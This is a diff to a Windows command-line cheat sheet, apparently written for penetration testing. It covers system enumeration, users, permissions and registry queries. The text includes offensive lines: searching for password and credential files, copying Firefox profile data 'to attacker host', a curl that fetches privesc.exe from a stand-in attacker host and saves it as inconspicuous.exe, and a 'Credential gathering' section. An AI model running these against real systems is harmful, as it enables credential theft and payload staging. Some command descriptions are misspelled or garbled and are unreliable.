@@ -1,14 +1,18 @@
 
 https://download.microsoft.com/download/1/3/2/1322897E-11C1-4E30-9EFC-70C1C2219048/Application%20Files/rdassistant_1_0_0_103/rdassistant.application
 
+
 WINDOWS COMMANDS
+
 
 	by
 		\<3\<3\<3\<3\<3\<3\<3\
 			ThePacketBender
 		\<3\<3\<3\<3\<3\<3\<3\
 
+
 https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/windows-commands
+
 		
 BASIC
 systeminfo
@@ -94,6 +98,10 @@ cscript.exe <script js/vbs/c#>
 winstat features
 auditpol /get /category:*
 	-audit policies
+clip < file.ext
+	copy file contents to clipboard from file, ctrl+c
+type plain.txt | clip
+	-pipe stdout of file contents to stind for clipboard, ctrl+c
 
 	
 	
@@ -102,6 +110,8 @@ type file
 	-print file
 dir /s *pass* == *cred* == *vnc* == *.config*
 dir \ /s /b | find /I “searchstring”
+dir .\ /A DHSLRAO /O NG /Q /R /S /T A /D
+	--dir PATH of pwd as relative returning for all files (including directories) [*assumes volume in drive has been delegated appropriate/correct label, else throws single File Not Found error], sorting returned order by directory then delimiting directories by grouped order. Displaying file ownership metadata, alternative data streams to which a file may be linked using wide list format [includes heading information or summary for each file handle] and list sorts by column.
 findstr /si password *.xml *.ini *.txt
 fsutil fsinfo drives
 	-list drives currently on the system
@@ -141,12 +151,18 @@ net use Z: /delete
 	-disconnect network drive
 xcopy /C /S %appdata%\Mozilla\Firefox\Profiles\*.sqlite \\your_box\firefox_funstuff
 	-copy firefox localfiles to attacker host
+curl http://api.target.dom/endpoint/1
+	-return response body value off http request to stdout
+curl https://attacker.dom/privesc.exe -o inconspicuous.exe
+	return response body of http request to file, see wget
 bcdedit /export <filename>
 
 	
 USERS/GROUPS
 whoami
 net users
+net1 users /domain
+	--remnant fork of net retained from windows 98
 net user /domain
 	-list users in current domain
 net user username
@@ -182,6 +198,10 @@ dsmod user administrator -pwd NewPassword -mustchpwd yes
 gpresult /z
 	-verbose output of group policy settings
 
+Credential gathering
+cmdkey /list
+	-write contents to keymgr.dll to stdout
+		--equivelant of gui "Credential Manager" in Control Panel
 
 Permissions
 icacls "D:\test" /grant John:(OI)(CI)F /T
@@ -335,6 +355,16 @@ slmgr.vbs /rearm
 	reactivate windows license key (**import for running Windows testing environment VMs)
 slmgr.vbs computername username password /option
 	run slmgr remotely
+
+
+Encoding/Encryption
+certutil -encode file.txt hw-encoded_file.crt
+	--base64 econde an input
+certutil -decode hw-encoded_file.ext stdout.txt
+	--convert base64-encoded file to plaintext
+certutil -deoodehex hex.xxd plain.txt
+	--decode hex-encoded input
+certutil -encodehex plain.txt hex.xxd
 
 
 INTERESTING FILES
@@ -530,6 +560,8 @@ reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
 	-check powershell logging status
 hivesh /registry/file
 	-browse registry hive
+regedit.exe
+	-prompt gui to browse and edit registry give values
 	
 	
 Active Directory
